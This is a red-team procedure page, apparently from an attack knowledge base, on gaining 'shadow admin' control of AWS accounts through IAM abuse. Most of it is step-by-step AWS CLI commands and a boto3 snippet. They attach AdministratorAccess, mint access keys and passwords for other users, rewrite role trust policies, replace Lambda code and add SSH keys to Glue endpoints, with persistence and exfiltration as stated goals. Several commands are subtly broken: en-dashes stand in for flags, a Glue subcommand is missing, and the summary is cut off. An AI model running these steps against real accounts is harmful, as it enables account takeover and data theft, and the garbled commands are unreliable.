---
id: 8bab4397-0cbf-44db-a6b6-fae25805841b
name: AWS Shadow Admin Access
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:09.346557+00:00'
updated_at: '2023-04-10T20:19:54.686913+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
- '[[Create Account|T1136 - Create Account]]'
tags:
- '[[Admin equivalent permission]]'
- '[[AWS - Shadow Admin]]'
- '[[Cloud - AWS]]'
commands:
- '[[Add user to IAM group]]'
- '[[Associate IAM instance profile with EC2 instance]]'
- '[[Attach AdministratorAccess policy to role role_i_can_assume]]'
- '[[Attach AdministratorAccess policy to user my_username]]'
- '[[Attach AdministratorAccess policy to user my_username]]'
- '[[Attach IAM policy to user]]'
- '[[Create Access Key for IAM User]]'
- '[[Create IAM User Policy]]'
- '[[Create Lambda Function]]'
- '[[Create new policy version and set as default]]'
- '[[Invoke Lambda Function]]'
- '[[Update IAM role assume policy]]'
- '[[Upload SSH Public Key to AWS Glue Endpoint]]'
- '[[Upload Zip File]]'
- '[[Wildcard Resource and Action]]'
---

# AWS Shadow Admin Access

## Summary

AWS Shadow Admin Access is a technique used by attackers to gain administrative privileges on an AWS account. This is achieved by creating a new user with administrator access or by adding an inline policy to an existing user or role. The attacker can also escalate privileges by manipulating AWS IA

## Description

# Description

AWS Shadow Admin Access is a technique used by attackers to gain administrative privileges on an AWS account. This is achieved by creating a new user with administrator access or by adding an inline policy to an existing user or role. The attacker can also escalate privileges by manipulating AWS IAM policies, roles, and permissions. Once the attacker has obtained administrative privileges, they can perform any action on the AWS account, including modifying resources, creating new users, and accessing sensitive data. This technique can be used to maintain persistence and exfiltrate data from the target organization.

 

## Requirements

1. Valid AWS account credentials

1. Access to the AWS Management Console or AWS CLI

1. Knowledge of AWS IAM policies, roles, and permissions

 

## Defense

1. Enforce the principle of least privilege by granting users only the permissions they need to perform their tasks

1. Monitor AWS IAM policies, roles, and permissions for suspicious activity

1. Enable AWS CloudTrail to log all AWS API calls and analyze the logs for potential security issues

 

## Objectives

1. Gain administrative privileges on an AWS account

1. Maintain persistence on the target system

1. Exfiltrate sensitive data from the target organization

 

# Instructions

1. To grant administrator access, use this command with the following arguments:
- Action: The action to be performed. In this case, it is set to '*'.
- Resource: The resource to which the action is applied. In this case, it is set to '*'.

 



**Code**: [["Action": "*"
"Resource": "*"]]



> This command grants administrator access to a resource by allowing any action to be performed on any resource. It is a powerful command and should be used with caution.



**Command** ([[Wildcard Resource and Action]]):

```bash
"Action": "*"
"Resource": "*"
```



2. To attach an IAM instance profile to an EC2 instance using this command, you need to provide the name of the IAM instance profile and the instance ID as arguments. The instance ID is the unique identifier of the EC2 instance to which you want to attach the IAM instance profile.

 



**Code**: [[aws ec2 associate-iam-instance-profile --iam-insta]]



> This command is useful when you want to grant permissions to an EC2 instance to access AWS resources. By attaching an IAM instance profile to an EC2 instance, you can provide the necessary permissions to the instance without having to store AWS access keys on the instance itself. The IAM instance profile contains the necessary permissions in the form of IAM roles, which the EC2 instance can assume to access AWS resources.



**Command** ([[Associate IAM instance profile with EC2 instance]]):

```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789
```



3. Use this command to create a new access key for an IAM user. This command generates a new access key and secret access key for the target user. The access key can be used to authenticate API requests made by the user.

 



**Code**: [[aws iam create-access-key –user-name target_user]]



> The `–user-name` parameter specifies the name of the IAM user for whom you want to create a new access key. This command can be used by an IAM administrator to create an access key for another IAM user. The access key consists of an access key ID and a secret access key. The access key ID is used to identify the access key when making API requests, while the secret access key is used to sign requests. The access key is valid until it is deleted or revoked.



**Command** ([[Create Access Key for IAM User]]):

```bash
aws iam create-access-key --user-name target_user
```



4. To create a new login profile for a user in AWS IAM, use the 'aws iam create-login-profile' command. Specify the target user with the '--user-name' flag and provide a strong password with the '--password' flag. Use the '--no-password-reset-required' flag to prevent the user from being prompted to reset their password on first login.

 



**Code**: [[$ aws iam create-login-profile –user-name target_u]]



> The 'aws iam create-login-profile' command is used to add a new password-based login profile for a specified user in AWS IAM. The '--user-name' flag is used to specify the target user. The '--password' flag is used to set a new password for the user. The '--no-password-reset-required' flag is used to prevent the user from being prompted to reset their password on first login. This command can be used to impersonate the user and perform actions on their behalf.

5. Use the following command to reset the login password for an IAM user:

aws iam update-login-profile --user-name <target_user> --password '<new_password>' --no-password-reset-required

Replace <target_user> with the username of the IAM user whose password you want to reset, and <new_password> with the new password you want to set for the user.

 



**Code**: [[$ aws iam update-login-profile –user-name target_u]]



> This command updates the login profile for the specified IAM user. The --password parameter is used to specify the new password for the user. The --no-password-reset-required parameter is used to indicate that the user does not need to reset their password the next time they log in. This command can be used to reset the login password for any IAM user, as long as you have the necessary permissions.

6. To attach an existing admin policy to a user, group or role in AWS IAM, use the **aws iam attach-user-policy**, **aws iam attach-group-policy** or **aws iam attach-role-policy** command respectively. Provide the name of the user, group or role and the ARN of the policy you want to attach.

 



**Code**: [[$ aws iam attach-user-policy –user-name my_usernam]]



> The **aws iam attach-user-policy** command attaches an existing policy to a specified user in AWS IAM. Similarly, the **aws iam attach-group-policy** command attaches an existing policy to a specified group, and the **aws iam attach-role-policy** command attaches an existing policy to a specified role. In this specific example, the command attaches the AdministratorAccess policy to a specified user or role. The policy grants full access to all AWS services and resources, and should be used with caution.



**Command** ([[Attach AdministratorAccess policy to user my_username]]):

```bash
$ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```





**Command** ([[Attach AdministratorAccess policy to user my_username]]):

```bash
$ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```





**Command** ([[Attach AdministratorAccess policy to role role_i_can_assume]]):

```bash
$ aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```



7. To add an inline policy to an IAM user, use the AWS CLI command 'aws iam put-user-policy'. Specify the name of the user, the name of the policy, and the path to the policy document in JSON format.

 



**Code**: [[$ aws iam put-user-policy –user-name my_username –]]



> This command allows an attacker to grant additional privileges to a previously compromised IAM user. The 'iam:PutUserPolicy' command is used to add an inline policy to a specific user. The 'iam:PutGroupPolicy' command is used to add an inline policy to a specific group, and the 'iam:PutRolePolicy' command is used to add an inline policy to a specific role. The policy document should be carefully crafted to grant only the necessary privileges to the user, group, or role.



**Command** ([[Create IAM User Policy]]):

```bash
$ aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json
```



8. To add a user to a specific group in the organization, use the `add-user-to-group` command. Replace `target_group` with the name of the group you want to add the user to and `my_username` with the username of the user you want to add.

 



**Code**: [[$ aws iam add-user-to-group –group-name target_gro]]



> This command adds a user to a specified group within the organization. The `group-name` argument specifies the name of the group that the user will be added to, while the `user-name` argument specifies the username of the user that will be added to the group. This command is useful for managing access control within the organization, as it allows you to easily add or remove users from specific groups as needed.



**Command** ([[Add user to IAM group]]):

```bash
$ aws iam add-user-to-group –group-name target_group –user-name my_username
```



9. To update the assuming permissions of a privileged role and assume it with a non-privileged account, use the following command:

 



**Code**: [[$ aws iam update-assume-role-policy –role-name rol]]



> The `aws iam update-assume-role-policy` command is used to update the assuming permissions of a privileged role with a policy document located at the specified path. This command is followed by the `aws sts assume-role` command to assume the updated role with a non-privileged account. The `–role-name` parameter specifies the name of the role to update, and the `–policy-document` parameter specifies the path to the policy document containing the updated permissions. After updating the role, use the `aws sts assume-role` command to assume the updated role with a non-privileged account.



**Command** ([[Update IAM role assume policy]]):

```bash
$ aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json
```



10. To update an IAM policy and set it as default, use the above command with the following arguments:
1. target_policy_arn - The ARN of the policy to update.
2. policy-document - The JSON policy document that describes the policy.
3. version-id - The ID of the policy version to set as the default version.

 



**Code**: [[$ aws iam create-policy-version –policy-arn target]]



> The `iam:CreatePolicyVersion` command creates a new version of an existing policy and sets the specified version as the policy's default version. The `iam:SetDefaultPolicyVersion` command sets the specified version of a policy as the default version. This allows non-privileged entities to become privileged ones and perform actions that they were not previously authorized to do. The `policy-document` argument should contain the policy in JSON format. The `version-id` argument is optional and will default to the new version created by the `iam:CreatePolicyVersion` command if not specified.



**Command** ([[Create new policy version and set as default]]):

```bash
$ aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default
$ aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2
```



11. To update the code for a Lambda function, use the 'aws lambda update-function-code' command followed by the function name and the location of the updated code. For example:

 



**Code**: [[$ aws lambda update-function-code –function-name t]]



> In the above example, the 'aws lambda update-function-code' command is used to update the code for the 'target_function' Lambda function. The updated code is located in the 'my/lambda/code/zipped.zip' file. This command can be useful when you need to make changes to the code running in your Lambda function.



**Command** ([[Upload Zip File]]):

```bash
$ aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip
```



12. To grant SSH access to a Glue development endpoint, use the following command:

 



**Code**: [[$ aws glue –endpoint-name target_endpoint –public-]]



> Replace `target_endpoint` with the name of the endpoint you want to grant SSH access to. Replace `path/to/my/public/ssh/key.pub` with the path to your public SSH key. This command will update the specified Glue development endpoint to allow SSH access using the specified public key.



**Command** ([[Upload SSH Public Key to AWS Glue Endpoint]]):

```bash
$ aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub
```



13. To create and invoke a Lambda function, use the following commands:

 



**Code**: [[$ aws lambda create-function –function-name my_fun]]



> The `create-function` command is used to create a new Lambda function with the specified function name, runtime, IAM role, handler, and code. The `invoke` command is used to invoke the Lambda function with the specified function name and output file. The `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` IAM permissions should be granted to the user to allow them to create and invoke Lambda functions.



**Command** ([[Create Lambda Function]]):

```bash
$ aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py
```





**Command** ([[Invoke Lambda Function]]):

```bash
$ aws lambda invoke –function-name my_function output.txt
```



14. This code snippet demonstrates how to attach the AdministratorAccess policy to a user in the AWS Identity and Access Management (IAM) service using the Boto3 library in Python.

 



**Code**: [[import boto3
def lambda_handler(event, context):
 ]]



> The `attach_user_policy` method of the `boto3.client('iam')` object is used to attach the `AdministratorAccess` policy to a user specified by the `UserName` parameter. The `PolicyArn` parameter specifies the Amazon Resource Name (ARN) of the policy to attach. In this case, the `PolicyArn` parameter specifies the ARN of the `AdministratorAccess` policy provided by AWS. The method returns a response object that contains information about the operation.



**Command** ([[Attach IAM policy to user]]):

```bash
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
    UserName='my_username',
    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]
- [[Create Account|T1136 - Create Account]]

## Commands Used

- [[Add user to IAM group]]
- [[Associate IAM instance profile with EC2 instance]]
- [[Attach AdministratorAccess policy to role role_i_can_assume]]
- [[Attach AdministratorAccess policy to user my_username]]
- [[Attach AdministratorAccess policy to user my_username]]
- [[Attach IAM policy to user]]
- [[Create Access Key for IAM User]]
- [[Create IAM User Policy]]
- [[Create Lambda Function]]
- [[Create new policy version and set as default]]
- [[Invoke Lambda Function]]
- [[Update IAM role assume policy]]
- [[Upload SSH Public Key to AWS Glue Endpoint]]
- [[Upload Zip File]]
- [[Wildcard Resource and Action]]

## Tags

- [[Admin equivalent permission]]
- [[AWS - Shadow Admin]]
- [[Cloud - AWS]]


